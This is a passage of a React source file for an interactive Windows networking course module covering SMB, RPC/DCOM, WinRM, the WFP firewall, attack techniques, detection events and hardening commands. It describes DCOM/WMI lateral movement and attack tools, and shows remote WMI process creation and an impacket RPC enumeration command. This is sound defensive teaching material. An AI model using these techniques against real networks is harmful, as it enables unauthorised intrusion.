      { name: "DCom / WMI Lateral Movement", color: C.orange,
        prereq: "Admin rights on target + DCOM port 135 accessible",
        how: "Invoke-WmiMethod or COM object activation via DCOM. Executes process on remote host. No new service, no SMB file write. Uses ports 135 + dynamic. wmiprvse.exe spawns payload. Very common in post-exploitation frameworks (Cobalt Strike, Metasploit). CrackMapExec --exec-method wmiexec.",
        detect: "Sysmon Event 1: wmiprvse.exe spawning cmd.exe/powershell.exe on target. Event 4648 (explicit credential use) if alternate creds. Network: DCOM ports from workstation to server. IDS: DCOM activation packets from non-management hosts.", ioc: "wmiprvse.exe as parent of cmd.exe/powershell.exe on target host. DCOM network traffic (port 135 + dynamic) from workstation to DC or server." },
    ],
  };
  const items = attacks[tab] || [];
  return (
    <div>
      {items.map(item => (
        <div key={item.name} style={{ background: "#08090d", border: `1px solid ${item.color}33`, borderRadius: "5px", padding: "14px", marginBottom: "12px" }}>
          <div style={{ display: "flex", gap: "12px", alignItems: "center", marginBottom: "8px", flexWrap: "wrap" }}>
            <span style={{ color: item.color, fontWeight: "800", fontSize: "13px" }}>{item.name}</span>
            <span style={S.badge(C.dim)}>PREREQ: {item.prereq}</span>
          </div>
          <div style={S.grid2}>
            <div>
              <div style={{ color: item.color, fontWeight: "700", fontSize: "11px", marginBottom: "6px" }}>▸ HOW IT WORKS</div>
              <div style={{ color: C.dim, fontSize: "11px", lineHeight: "1.7", borderLeft: `2px solid ${item.color}44`, paddingLeft: "10px" }}>{item.how}</div>
            </div>
            <div>
              <div style={{ color: C.green, fontWeight: "700", fontSize: "11px", marginBottom: "6px" }}>▸ DETECTION</div>
              <div style={{ background: "#08120a", border: `1px solid ${C.green}22`, borderRadius: "3px", padding: "8px", marginBottom: "8px" }}>
                <div style={{ color: C.dim, fontSize: "11px" }}>{item.detect}</div>
              </div>
              <div style={{ color: C.red, fontWeight: "700", fontSize: "11px", marginBottom: "4px" }}>▸ IOC SIGNATURE</div>
              <div style={{ background: "#120808", border: `1px solid ${C.red}22`, borderRadius: "3px", padding: "8px" }}>
                <div style={{ color: C.dim, fontSize: "11px" }}>{item.ioc}</div>
              </div>
            </div>
          </div>
        </div>
      ))}
    </div>
  );
};

/* ── Network Workflow ───────────────────────────────────────────────────── */
const NetWorkflow = () => {
  const steps = [
    { id:"01", label:"App calls connect() / WSASend()", sub:"Winsock 2 API → ws2_32.dll → afd.sys", color:C.green, detail:"User-mode socket call marshalled by AFD.sys. File object created for socket. IOCTL dispatched to TCP/IP kernel stack (tcpip.sys). Async I/O completion port used for non-blocking operations." },
    { id:"02", label:"DNS resolution (if needed)", sub:"dnsapi.dll → dnscache → DNS server (port 53)", color:C.teal, detail:"Hostname lookup: check hosts file → DNS cache → DNS server query. AD domain: DC is DNS server. DNSSEC validation (if configured). Result cached in dnscache for TTL duration." },
    { id:"03", label:"TCP SYN sent through TCP/IP stack", sub:"tcpip.sys builds IP packet → NDIS → NIC", color:C.cyan, detail:"TCB (Transmission Control Block) allocated. SYN packet constructed: source port (ephemeral 49152+), dest port, ISN (random). WFP inspects packet at OUTBOUND_TRANSPORT layer — allowed or blocked per firewall rules." },
    { id:"04", label:"WFP evaluates all filter layers", sub:"Firewall rules checked → PERMIT or BLOCK", color:C.pink, detail:"Windows Filtering Platform: checks all registered filters at OUTBOUND_TRANSPORT + ALE_AUTH_CONNECT layers. Process identity verified (PID to image path). Network profile (Domain/Private/Public) determines rule set. Third-party EDR callout drivers can inspect/modify." },
    { id:"05", label:"Packet passes to NDIS miniport", sub:"Network adapter driver queues for transmission", color:C.orange, detail:"NDIS 6.x send path: protocol driver → intermediate driver (virtual switch if VM) → miniport adapter. Hardware offload: checksum, LSO (Large Send Offload) computed by NIC firmware. DMA transfer to NIC transmit ring." },
    { id:"06", label:"TCP handshake completes", sub:"SYN / SYN-ACK / ACK — connection established", color:C.yellow, detail:"SYN-ACK received → ACK sent. TCB transitions to ESTABLISHED. Socket ready for data. SMB/WinRM/RDP then negotiate their application protocol on top of TCP." },
    { id:"07", label:"Application protocol negotiation", sub:"SMB NEGOTIATE / HTTP Upgrade / RDP handshake", color:C.purple, detail:"e.g. SMB: NEGOTIATE_PROTOCOL_REQUEST → dialect selection → SESSION_SETUP (Kerberos/NTLM auth) → TREE_CONNECT to share. TLS handshake if HTTPS/LDAPS/WinRM HTTPS. Certificate validation, cipher suite negotiation." },
    { id:"08", label:"Data transfer + WFP STREAM inspection", sub:"Payload flows through TCP stream layer", color:C.sky, detail:"Ongoing data transfer. WFP STREAM layer can inspect TCP payload bytes (DPI). Network Inspection System (NIS) in Windows Defender uses this for signature-based detection. EDR vendors hook here for lateral movement detection." },
  ];
  return (
    <div>
      {steps.map((s, i) => (
        <div key={s.id} style={{ display: "flex", gap: "0" }}>
          <div style={{ display: "flex", flexDirection: "column", alignItems: "center", width: "30px" }}>
            <div style={{ width: "22px", height: "22px", borderRadius: "50%", background: `${s.color}18`, border: `1.5px solid ${s.color}`, display: "flex", alignItems: "center", justifyContent: "center", fontSize: "9px", color: s.color, fontWeight: "700", flexShrink: 0 }}>{s.id}</div>
            {i < steps.length - 1 && <div style={{ width: "1px", height: "28px", background: `${s.color}33` }} />}
          </div>
          <div style={{ paddingLeft: "10px", paddingBottom: "8px", flex: 1 }}>
            <div style={{ display: "flex", gap: "8px", alignItems: "center", flexWrap: "wrap" }}>
              <span style={{ color: s.color, fontWeight: "700", fontSize: "12px" }}>{s.label}</span>
              <span style={S.badge(s.color)}>{s.sub}</span>
            </div>
            <div style={{ color: C.dim, fontSize: "11px", marginTop: "2px", fontStyle: "italic" }}>{s.detail}</div>
          </div>
        </div>
      ))}
    </div>
  );
};

export default function WindowsStep09() {
  const [archTab, setArchTab] = useState("stack");
  const [intTab,  setIntTab]  = useState("rpc");
  const [atkTab,  setAtkTab]  = useState("smb");
  const [monTab,  setMonTab]  = useState("events");
  const [defTab,  setDefTab]  = useState("firewall");
  const [cmpTab,  setCmpTab]  = useState("protocols");

  return (
    <div style={S.root}>
      <div style={S.bar}>
        <div style={{ display: "flex", gap: "6px" }}>
          {[C.red, C.yellow, C.green].map((c, i) => <span key={i} style={S.dot(c)} />)}
        </div>
        <span style={{ color: C.sky, fontSize: "11px", fontWeight: "700", letterSpacing: "2px" }}>WIN-INTERNALS//CONSOLE</span>
        <span style={{ color: C.dim, fontSize: "10px", marginLeft: "auto" }}>MODULE 09 · NETWORK ENGINE · NT 10.0</span>
        <span style={S.dot(C.green)} />
      </div>

      <div style={S.wrap}>

        {/* ── 1: Title ── */}
        <div style={{ ...S.panel(C.sky), background: "linear-gradient(135deg, #080b14 55%, #001824)" }}>
          <div style={S.pb}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", flexWrap: "wrap", gap: "12px" }}>
              <div>
                <div style={{ color: C.dim, fontSize: "10px", letterSpacing: "3px", marginBottom: "5px" }}>WINDOWS INTERNALS CURRICULUM · STEP 09</div>
                <div style={{ color: C.sky, fontSize: "22px", fontWeight: "800", lineHeight: "1.2" }}>Windows Networking</div>
                <div style={{ color: C.bright, fontSize: "14px", fontWeight: "600", marginTop: "2px" }}>TCP/IP Stack · SMB · RPC/DCOM · WinRM · DNS · WFP Firewall · Network Attacks</div>
                <div style={{ color: C.dim, fontSize: "11.5px", marginTop: "5px" }}>The communication fabric of enterprise Windows — and the primary lateral movement highway for attackers</div>
              </div>
              <div style={{ display: "flex", flexDirection: "column", gap: "5px", alignItems: "flex-end" }}>
                <Pill c={C.green}>LEVEL: INTERMEDIATE → ADVANCED</Pill>
                <Pill c={C.sky}>DOMAIN: NETWORKING / PROTOCOLS / OFFENSE-DEFENSE</Pill>
                <Pill c={C.purple}>MODULE 09 / 20+</Pill>
              </div>
            </div>
            <hr style={S.sep} />
            <div style={{ display: "flex", gap: "6px", flexWrap: "wrap" }}>
              {["Network Engineer","Red Team","Blue Team","SOC Analyst","DFIR","Pen Tester","Security Architect","Firewall Admin","Threat Hunter"].map(r => (
                <Tag key={r} c={C.sky}>{r}</Tag>
              ))}
            </div>
          </div>
        </div>

        {/* ── 2: Concept ── */}
        <PB title="CONCEPT EXPLANATION" icon="🧠" color={C.cyan}>
          <div style={S.grid2}>
            <div>
              <div style={{ color: C.green, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ BEGINNER VIEW</div>
              <Row c={C.green}>Windows networking is a <strong style={{color:C.bright}}>layered stack</strong> — applications talk to Winsock, which talks to the kernel TCP/IP driver, which talks to network card drivers, which talk to physical hardware. Each layer has a specific job and a clean interface to the layer above and below.</Row>
              <Row c={C.green}><strong style={{color:C.bright}}>SMB</strong> (Server Message Block) is how Windows shares files and printers. Every enterprise runs on SMB — SYSVOL, home drives, shared documents all use it. It runs over TCP port 445 and is the most common lateral movement protocol attackers use.</Row>
              <Row c={C.green}><strong style={{color:C.bright}}>RPC</strong> (Remote Procedure Call) is the plumbing behind most Windows services — WMI, Task Scheduler, Event Log, DCOM all use RPC. It starts with port 135 (endpoint mapper) then uses dynamic high ports for the actual communication.</Row>
              <Row c={C.green}>The <strong style={{color:C.bright}}>Windows Firewall</strong> is implemented as WFP (Windows Filtering Platform) — a kernel-mode architecture where filter rules are evaluated at multiple points in the network stack. It controls inbound AND outbound traffic with per-application, per-port, and per-profile rules.</Row>
            </div>
            <div>
              <div style={{ color: C.purple, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ TECHNICAL INTERNALS</div>
              <Row c={C.purple}>The Windows TCP/IP stack is implemented in <strong style={{color:C.bright}}>tcpip.sys</strong> — a kernel-mode driver. Above it is <strong style={{color:C.bright}}>AFD.sys</strong> (Ancillary Function Driver) which bridges user-mode Winsock calls to the kernel. Below tcpip.sys is <strong style={{color:C.bright}}>NDIS</strong> (Network Driver Interface Specification) which abstracts the physical NIC.</Row>
              <Row c={C.purple}><strong style={{color:C.bright}}>SMB 3.1.1</strong> (current version) supports AES-128-GCM encryption of all traffic, pre-authentication integrity (SHA-512 hash of all negotiate/setup messages), and multichannel (bonding multiple NICs). SMB 1.0 is the legacy version vulnerable to EternalBlue and must be disabled.</Row>
              <Row c={C.purple}><strong style={{color:C.bright}}>WinRM</strong> (Windows Remote Management) implements the WS-Management protocol. It's the transport for PowerShell Remoting (Enter-PSSession, Invoke-Command). Runs on HTTP port 5985 or HTTPS 5986. Authentication via Kerberos (domain) or NTLM.</Row>
              <Row c={C.purple}><strong style={{color:C.bright}}>WFP layers</strong>: INBOUND_TRANSPORT → ALE_AUTH_RECV_ACCEPT → STREAM (inbound). OUTBOUND_TRANSPORT → ALE_AUTH_CONNECT → STREAM (outbound). Callout drivers (AV/EDR, VPN, IDS) hook into these layers for DPI without modifying tcpip.sys.</Row>
            </div>
          </div>
          <hr style={S.sep} />
          <div style={S.grid4}>
            {[
              ["SMB signing = relay blocker", "Without SMB signing, NTLM relay attacks work. Enforce signing on ALL systems: Set-SmbServerConfiguration -RequireSecuritySignature $true. High-impact, low-cost control.", C.red],
              ["Port 135 = lateral movement root", "RPC endpoint mapper. All DCOM/WMI lateral movement starts here. Block 135 inbound from workstations to servers where possible.", C.orange],
              ["LLMNR off = no poisoning", "Disable LLMNR and NBT-NS via GPO. Removes Responder attack surface completely. No legitimate use case in managed AD environment.", C.yellow],
              ["WinRM enable = admin tool", "WinRM is legitimate admin infrastructure but also a key lateral movement path. Restrict to PAW machines via WinRM security descriptors.", C.green],
            ].map(([t, d, c]) => (
              <div key={t} style={{ background: "#08090d", border: `1px solid ${c}22`, borderRadius: "4px", padding: "10px" }}>
                <div style={{ color: c, fontWeight: "700", fontSize: "11px", marginBottom: "4px" }}>▸ {t}</div>
                <div style={{ color: C.dim, fontSize: "11px" }}>{d}</div>
              </div>
            ))}
          </div>
        </PB>

        {/* ── 3: Architecture Diagrams ── */}
        <PB title="NETWORK ARCHITECTURE — TCP/IP STACK · SMB · WFP · PORT MAP" icon="🌐" color={C.purple} accent={C.purple + "44"}>
          <div style={{ display: "flex", gap: "8px", marginBottom: "14px", flexWrap: "wrap" }}>
            {[["stack","TCP/IP STACK"],["smb","SMB PROTOCOL"],["wfp","WFP FIREWALL"],["ports","PORT REFERENCE"]].map(([t, l]) => (
              <button key={t} style={S.tab(archTab === t, C.purple)} onClick={() => setArchTab(t)}>{l}</button>
            ))}
          </div>
          {archTab === "stack" && <TCPIPStack />}
          {archTab === "smb"   && <SMBDiagram />}
          {archTab === "wfp"   && <WFPDiagram />}
          {archTab === "ports" && <PortMap />}
        </PB>

        {/* ── 4: Workflow ── */}
        <PB title="WORKFLOW — WINDOWS NETWORK CONNECTION INTERNAL CHAIN" icon="⚙" color={C.orange}>
          <NetWorkflow />
          <hr style={S.sep} />
          <div style={{ color: C.dim, fontSize: "11px" }}>
            <strong style={{ color: C.orange }}>Security insight:</strong> WFP at Step 4 is the firewall decision point — but it evaluates rules based on PID/process identity, not just port numbers. This is why Windows Firewall can allow <code style={{color:C.cyan}}>svchost.exe</code> on port 445 while blocking your unknown application. EDRs hook Step 4 callouts to inspect traffic content, not just headers.
          </div>
        </PB>

        {/* ── 5: Commands ── */}
        <PB title="CMD / POWERSHELL — NETWORKING OPERATIONS & AUDIT" icon="⌨" color={C.green}>
          <div style={S.grid2}>
            <div>
              <div style={{ color: C.yellow, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ NETWORK STATE ENUMERATION</div>
              <div style={S.code}>
{`# Active connections + owning process:`}
{`C:\\> netstat -ano`}
{`PS> Get-NetTCPConnection | Select LocalAddress,`}
{`    LocalPort,RemoteAddress,RemotePort,State,`}
{`    @{N="Process";E={(Get-Process -Id $_.OwningProcess).Name}}`}
{``}
{`# SMB sessions and shares:`}
{`PS> Get-SmbSession`}
{`PS> Get-SmbShare`}
{`PS> Get-SmbServerConfiguration | Select`}
{`    RequireSecuritySignature,`}
{`    EnableSMB1Protocol,`}
{`    EncryptData`}
{``}
{`# SMB1 status (should be disabled):`}
{`PS> Get-WindowsOptionalFeature -Online`}
{`    -FeatureName SMB1Protocol`}
{``}
{`# WinRM status:`}
{`PS> Test-WSMan -ComputerName localhost`}
{`PS> Get-WSManInstance winrm/config`}
{``}
{`# DNS cache:`}
{`PS> Get-DnsClientCache`}
{`C:\\> ipconfig /displaydns`}
              </div>
            </div>
            <div>
              <div style={{ color: C.yellow, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ FIREWALL & SECURITY AUDIT</div>
              <div style={S.code}>
{`# List all firewall rules:`}
{`PS> Get-NetFirewallRule | Where Enabled -eq True |`}
{`    Select DisplayName, Direction, Action,`}
{`    @{N="Ports";E={($_ | Get-NetFirewallPortFilter).LocalPort}}`}
{``}
{`# Check if SMB is exposed externally:`}
{`PS> Get-NetFirewallRule | Where {`}
{`    ($_ | Get-NetFirewallPortFilter).LocalPort -eq 445`}
{`    -and $_.Direction -eq "Inbound"`}
{`    -and $_.Action -eq "Allow"}`}
{``}
{`# Block outbound SMB (contain lateral movement):`}
{`New-NetFirewallRule -DisplayName "Block SMB out"`}
{`    -Direction Outbound -Protocol TCP `}
{`    -LocalPort 445 -Action Block`}
{``}
{`# Disable LLMNR via registry:`}
{`reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient"`}
{`    /v EnableMulticast /t REG_DWORD /d 0 /f`}
{``}
{`# Disable NetBIOS over TCP/IP (WINS client):`}
{`# WMI: SetTcpipNetbios on all adapters`}
{`Get-WmiObject Win32_NetworkAdapterConfiguration |`}
{`    Where {$_.IPEnabled} |`}
{`    ForEach {$_.SetTcpipNetbios(2)}  # 2 = disable`}
              </div>
            </div>
          </div>
          <div style={{ marginTop: "12px" }}>
            <div style={{ color: C.yellow, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ RPC · WMI · WINRM OPERATIONS</div>
            <div style={S.code}>
{`# Test WinRM connectivity:`}
{`Test-WSMan -ComputerName server01`}
{`Enter-PSSession -ComputerName server01`}
{``}
{`# Enumerate RPC endpoints on remote host:`}
{`# (impacket) rpcdump.py corp.local/user:pass@10.0.0.1`}
{``}
{`# WMI remote query:`}
{`Get-WmiObject -Class Win32_Process -ComputerName server01`}
{`Invoke-WmiMethod -Class Win32_Process -Name Create`}
{`    -ArgumentList "whoami" -ComputerName server01`}
{``}
{`# Restrict WinRM access to specific hosts (Security Descriptor):`}
{`Set-WSManQuickConfig`}
{`Set-Item WSMan:\\localhost\\Service\\Auth\\Kerberos -Value $true`}
{`# Set IP filter to allow only specific management hosts:`}
{`Set-Item WSMan:\\localhost\\Service\\IPv4Filter 10.0.1.0/24`}
{``}
{`# Enable SMB signing + disable SMB1:`}
{`Set-SmbServerConfiguration -RequireSecuritySignature $true `}
{`    -EnableSMB1Protocol $false -Force`}
{`Set-SmbClientConfiguration -RequireSecuritySignature $true -Force`}
{``}
{`# Enable SMB encryption (SMB3 only):`}
{`Set-SmbServerConfiguration -EncryptData $true -Force`}
{`# Per-share: Set-SmbShare -Name Data -EncryptData $true`}
            </div>
          </div>
        </PB>

        {/* ── 6: Internal View ── */}
        <PB title="INTERNAL SYSTEM VIEW — RPC · DNS · WINRM" icon="🔬" color={C.teal}>
          <div style={{ display: "flex", gap: "8px", marginBottom: "14px", flexWrap: "wrap" }}>
            {[["rpc","RPC / DCOM INTERNALS"],["dns","DNS INTERNALS"],["winrm","WINRM / HTTP.SYS"]].map(([t, l]) => (
              <button key={t} style={S.tab(intTab === t, C.teal)} onClick={() => setIntTab(t)}>{l}</button>
            ))}
          </div>
          {intTab === "rpc"   && <RPCInternals />}
          {intTab === "dns"   && <DNSInternals />}
          {intTab === "winrm" && (
            <div style={S.grid2}>
              <div>
                <div style={{ color: C.purple, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ WINRM ARCHITECTURE</div>
                <div style={S.code}>
{`WinRM = WS-Management (WS-Man) protocol`}
{`Implemented by: WinRM service (winrm.cmd)`}
{`Port 5985 (HTTP) / 5986 (HTTPS)`}
{``}
{`Architecture:`}
{`  Client: WSMan.Automation.dll (PowerShell)`}
{`       ↓ HTTP(S) SOAP envelope`}
{`  Server: HTTP.sys (kernel HTTP listener)`}
{`       ↓`}
{`  WinRM service (WS-Man listener)`}
{`       ↓`}
{`  WSMan Plugin (PowerShell plugin / WSMan shell)`}
{`       ↓ spawns`}
{`  wsmprovhost.exe — WinRM provider host`}
{`       ↓ runs`}
{`  Your remote PowerShell commands`}
{``}
{`Authentication order:`}
{`  1. Kerberos (domain) — preferred`}
{`  2. Negotiate (SPNEGO — Kerberos or NTLM)`}
{`  3. NTLM (fallback, cross-domain)`}
{`  4. Certificate (HTTPS only)`}
{`  5. CredSSP (double-hop, delegate creds — risky)`}
{``}
{`Double-hop problem:`}
{`  Enter-PSSession srv1 → need to access srv2`}
{`  Kerberos ticket NOT forwarded by default`}
{`  Solutions: CredSSP (risky), Kerberos delegation,`}
{`    PowerShell JEA (Just Enough Administration)`}
                </div>
              </div>
              <div>
                <div style={{ color: C.sky, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ HTTP.SYS — KERNEL HTTP LISTENER</div>
                <div style={S.code}>
{`HTTP.sys: kernel-mode HTTP/HTTPS server`}
{`Used by: IIS, WinRM, WCF, Exchange, ADFS`}
{``}
{`URL ACL (access control via netsh):`}
{`netsh http show urlacl`}
{`# Shows who can listen on which URL prefix`}
{`# e.g. http://+:5985/wsman/ → NT SERVICE\\WinRM`}
{``}
{`SSL certificate binding:`}
{`netsh http show sslcert`}
{`# Maps port to certificate for HTTPS`}
{``}
{`Attack surface:`}
{`  # WinRM exposed with weak auth = lateral movement`}
{`  # HTTP.sys CVEs: MS15-034 (IIS range DoS)`}
{`  # URL ACL misconfiguration → hijack HTTP listener`}
{``}
{`JEA (Just Enough Administration):`}
{`  PowerShell remoting with constrained runspace`}
{`  Role capability files (.psrc) define allowed cmds`}
{`  Session configuration (.pssc) assigns roles`}
{`  Users get only necessary commands, not full shell`}
{`  Transcript logging mandatory for JEA sessions`}
                </div>
                <div style={{ marginTop: "10px" }}>
                  <div style={{ color: C.green, fontWeight: "700", marginBottom: "6px", fontSize: "11px" }}>▸ WINRM HARDENING</div>
                  {[
                    ["Restrict listeners to HTTPS only", "Delete HTTP listener (port 5985). Keep only HTTPS (5986) with valid cert. Prevents clear-text negotiation.", C.green],
                    ["WinRM IP filter", "Set-Item WSMan:\\localhost\\Service\\IPv4Filter — restrict to PAW subnets only.", C.teal],
                    ["Enable Kerberos auth only", "Disable NTLM auth in WinRM: Set-Item WSMan:\\localhost\\Service\\Auth\\Basic $false", C.cyan],
                    ["JEA for all admin remoting", "Replace unrestricted PSSession with role-constrained JEA sessions. Log all commands.", C.orange],
                  ].map(([t, d, c]) => (
                    <div key={t} style={{ background: "#08120a", border: `1px solid ${c}33`, borderRadius: "4px", padding: "9px", marginBottom: "6px" }}>
                      <div style={{ color: c, fontSize: "11px", fontWeight: "700", marginBottom: "3px" }}>✓ {t}</div>
                      <div style={{ color: C.dim, fontSize: "10.5px" }}>{d}</div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}
        </PB>

        {/* ── 7: Network Attack Matrix ── */}
        <PB title="NETWORK ATTACK TECHNIQUES — SMB · RECON · LATERAL" icon="⚔" color={C.red} accent={C.red + "44"}>
          <div style={{ display: "flex", gap: "8px", marginBottom: "14px", flexWrap: "wrap" }}>
            {[["smb","SMB ATTACKS"],["recon","RECON & POISONING"],["lateral","LATERAL MOVEMENT"]].map(([t, l]) => (
              <button key={t} style={S.tab(atkTab === t, C.red)} onClick={() => setAtkTab(t)}>{l}</button>
            ))}
          </div>
          <NetAttackPanel tab={atkTab} />
        </PB>

        {/* ── 8: Defense ── */}
        <PB title="DEFENSE — NETWORK HARDENING & SEGMENTATION" icon="🛡" color={C.green} accent={C.green + "44"}>
          <div style={{ display: "flex", gap: "8px", marginBottom: "14px", flexWrap: "wrap" }}>
            {["firewall","protocols","segmentation"].map(t => (
              <button key={t} style={S.tab(defTab === t, C.green)} onClick={() => setDefTab(t)}>{t.toUpperCase()}</button>
            ))}
          </div>

          {defTab === "firewall" && (
            <div>
              <div style={{ color: C.green, fontWeight: "700", marginBottom: "10px", fontSize: "11px" }}>▸ WINDOWS FIREWALL — CRITICAL RULES FOR ENTERPRISE HARDENING</div>
              <div style={S.grid2}>
                {[
                  ["Block inbound SMB from non-servers", "New-NetFirewallRule: Block inbound TCP 445 from workstation subnets. Only servers/DCs should receive SMB. Stops workstation-to-workstation lateral movement.", C.green],
                  ["Block outbound SMB from non-admin workstations", "Block outbound TCP 445 from workstations. Containment: compromised workstation cannot spread via SMB. Breaks most automated worm propagation.", C.green],
                  ["Restrict RDP to PAW / jump hosts only", "Block inbound TCP 3389 except from defined management IP ranges. Eliminate RDP exposure to general workstation network.", C.cyan],
                  ["Block outbound RPC from workstations to servers", "Restrict outbound TCP 135 + dynamic 49152-65535 from workstations. Limits DCOM/WMI lateral movement from compromised workstations.", C.teal],
                  ["Allow WinRM from PAW VLAN only", "Block inbound TCP 5985/5986 except from PAW subnet. Prevents WinRM lateral movement from general network.", C.orange],
                  ["Block NetBIOS (137-139) everywhere", "Block UDP 137, UDP 138, TCP 139 at perimeter AND between internal segments. No legitimate modern use case.", C.green],
                ].map(([t, d, c]) => (
                  <div key={t} style={{ background: "#08120a", border: `1px solid ${c}33`, borderRadius: "4px", padding: "10px", marginBottom: "8px" }}>
                    <div style={{ color: c, fontSize: "11px", fontWeight: "700", marginBottom: "4px" }}>✓ {t}</div>
                    <div style={{ color: C.dim, fontSize: "11px" }}>{d}</div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {defTab === "protocols" && (
            <div style={S.code}>
{`# ── SMB HARDENING ──`}
{`# Disable SMB1 (CRITICAL):`}
{`Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol`}
{`Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force`}
{``}
{`# Require SMB signing on server AND client:`}
{`Set-SmbServerConfiguration -RequireSecuritySignature $true -Force`}
{`Set-SmbClientConfiguration -RequireSecuritySignature $true -Force`}
{``}
{`# Enable SMB3 encryption:`}
{`Set-SmbServerConfiguration -EncryptData $true -Force`}
{``}
{`# ── DNS / LLMNR HARDENING ──`}
{`# Disable LLMNR (Group Policy):`}
{`# Computer Config → Admin Templates → Network → DNS Client`}
{`# → Turn off Multicast Name Resolution = Enabled`}
{``}
{`# Disable NetBIOS name service:`}
{`$adapters = Get-WmiObject Win32_NetworkAdapterConfiguration`}
{`$adapters | Where {$_.IPEnabled} | `}
{`    ForEach {$_.SetTcpipNetbios(2)}`}
{``}
{`# Enable DNSSEC on AD DNS zones:`}
{`# Requires AD-integrated zone on 2012+ DCs`}
{`PS> Add-DnsServerSigningScope -ZoneName "corp.local" `}
{`    -ScopeName "Default"`}
{``}
{`# ── RPC / DCOM HARDENING ──`}
{`# Restrict DCOM launch permissions:`}
{`dcomcnfg.exe → Component Services → My Computer`}
{`→ Properties → COM Security → Edit Limits`}
{``}
{`# ── WINRM ──`}
{`# Restrict WinRM to HTTPS only:`}
{`winrm delete winrm/config/Listener?Address=*+Transport=HTTP`}
{``}
{`# Disable Print Spooler on all DCs (stops PrintNightmare):`}
{`Stop-Service Spooler; Set-Service Spooler -StartupType Disabled`}
            </div>
          )}

          {defTab === "segmentation" && (
            <div>
              <div style={{ color: C.green, fontWeight: "700", marginBottom: "10px", fontSize: "11px" }}>▸ NETWORK SEGMENTATION MODEL — EAST-WEST TRAFFIC CONTROL</div>
              <div style={S.grid3}>
                {[
                  { zone: "Tier 0 — DC / PKI VLAN", color: C.red, allow: ["DCs talking to DCs (replication: 389,636,3268,49152+)","Clients auth to DCs (88,389,445)","PAW VLAN to DCs (RDP 3389, WinRM 5986)","Monitoring to DCs (SNMP, WMI from SOC)"], block: ["All workstation direct DC access except auth ports","Internet outbound from DC","RPC 135 from workstations to DCs (only admin needed)"] },
                  { zone: "Tier 1 — Server VLAN", color: C.orange, allow: ["Server-to-server on required service ports","Clients to servers (445 for shares, app ports)","PAW to servers (3389, 5986)","Servers to DCs (auth)"], block: ["Servers cannot initiate SMB/RDP to workstations","No server outbound to Internet (proxy required)","Workstation cannot SMB/WMI to servers except specific IPs"] },
                  { zone: "Tier 2 — Workstation VLAN", color: C.cyan, allow: ["Workstations to servers (app ports only)","Workstations to DCs (auth: 88, 389)","Workstations to Internet via proxy (80,443)","Helpdesk PAW to workstations (3389)"], block: ["Workstation-to-workstation SMB (445) BLOCKED","Workstation outbound RPC/DCOM (135)","Workstation direct to DC admin ports","LLMNR/NBT-NS blocked at switch level (port isolation)"] },
                ].map(({ zone, color, allow, block }) => (
                  <div key={zone} style={{ background: "#08090d", border: `1px solid ${color}44`, borderRadius: "5px", padding: "12px" }}>
                    <div style={{ color, fontWeight: "700", fontSize: "11px", marginBottom: "10px" }}>▸ {zone}</div>
                    <div style={{ color: C.green, fontSize: "10px", fontWeight: "700", marginBottom: "4px" }}>ALLOW:</div>
                    {allow.map(a => <div key={a} style={{ display: "flex", gap: "5px", marginBottom: "4px" }}><span style={{ color: C.green, fontSize: "9px" }}>✓</span><span style={{ color: C.dim, fontSize: "10px" }}>{a}</span></div>)}
                    <div style={{ color: C.red, fontSize: "10px", fontWeight: "700", margin: "8px 0 4px" }}>BLOCK:</div>
                    {block.map(b => <div key={b} style={{ display: "flex", gap: "5px", marginBottom: "4px" }}><span style={{ color: C.red, fontSize: "9px" }}>✗</span><span style={{ color: C.dim, fontSize: "10px" }}>{b}</span></div>)}
                  </div>
                ))}
              </div>
            </div>
          )}
        </PB>

        {/* ── 9: Monitoring ── */}
        <PB title="MONITORING — NETWORK EVENTS · DETECTION RULES · TOOLS" icon="👁" color={C.yellow}>
          <div style={{ display: "flex", gap: "8px", marginBottom: "14px", flexWrap: "wrap" }}>
            {["events","sysmon","tools","iocs"].map(t => (
              <button key={t} style={S.tab(monTab === t, C.yellow)} onClick={() => setMonTab(t)}>{t.toUpperCase()}</button>
            ))}
          </div>

          {monTab === "events" && (
            <div style={S.grid2}>
              {[
                ["5140", "Security", "Network share accessed — object name, client IP, account. Alert: ADMIN$ and C$ access from non-admin.", C.orange],
                ["5142", "Security", "Network share added. New share creation = potential data staging.", C.yellow],
                ["5145", "Security", "Network share object access check. Granular share audit. High volume — filter to sensitive shares only.", C.dim],
                ["5156", "Security (WFP)", "WFP allowed network connection. Application name, source/dest IP:port. Very high volume — use selectively.", C.dim],
                ["5157", "Security (WFP)", "WFP blocked network connection. Every blocked connection logged. Alert on blocked DC-to-DC or unusual protocol.", C.orange],
                ["7045", "System", "Service installed — PsExec-style lateral movement. Service name + binary path in ADMIN$.", C.red],
                ["4698", "Security", "Scheduled task created — remote task creation over RPC is lateral movement technique.", C.orange],
                ["1", "Sysmon", "Process create — parent-child chain for lateral movement (wsmprovhost.exe, wmiprvse.exe spawning shells).", C.red],
                ["3", "Sysmon", "Network connection — outbound from interesting processes (powershell.exe → external, cmd.exe → SMB).", C.orange],
              ].map(([id, log, desc, c]) => (
                <div key={id} style={{ display: "flex", gap: "10px", marginBottom: "7px", alignItems: "flex-start" }}>
                  <div style={{ display: "flex", flexDirection: "column", gap: "2px", flexShrink: 0 }}>
                    <span style={{ ...S.badge(c), minWidth: "38px", textAlign: "center" }}>{id}</span>
                    <span style={{ color: C.dim, fontSize: "9px", textAlign: "center" }}>{log}</span>
                  </div>
                  <span style={{ color: C.dim, fontSize: "11px" }}>{desc}</span>
                </div>
              ))}
            </div>
          )}

          {monTab === "sysmon" && (
            <div>
              <div style={{ color: C.yellow, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ SYSMON NETWORK DETECTION RULES</div>
              <div style={S.code}>
{`<!-- Detect lateral movement via SMB from PowerShell: -->`}
